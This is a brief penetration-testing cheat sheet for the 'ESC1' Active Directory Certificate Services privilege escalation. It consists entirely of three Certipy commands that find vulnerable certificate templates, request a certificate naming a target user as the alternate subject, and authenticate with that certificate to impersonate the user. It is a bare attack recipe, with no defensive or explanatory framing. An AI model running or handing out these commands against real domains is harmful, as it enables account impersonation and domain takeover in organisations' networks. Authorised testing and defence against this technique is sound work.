# ESC1 Privilege Escalation

# perform vuln cert enumeration
certipy-ad find -u $USER -p $PASSWORD -dc-ip $DC_IP -stdout -vulnerable

# request certificate using alt SAN
certipy req -u $USER -p $PASSWORD -dc-ip $DC_IP -ca $CA -template $TEMPLATE -upn $TARGET

# authenticate using cert 
certipy auth -pfx $TARGET.pfx -username $TARGET -domain $DOMAIN -dc-ip $DC_IP
